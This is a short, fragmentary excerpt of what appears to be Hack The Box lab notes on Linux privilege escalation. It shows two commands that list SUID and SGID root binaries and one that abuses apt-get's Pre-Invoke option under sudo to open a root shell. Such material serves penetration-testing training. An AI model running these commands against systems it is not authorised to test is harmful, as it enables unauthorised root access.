...
```powershell
hunji@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null
...
```powershell
hunji@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null
...
```powershell
hunji@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
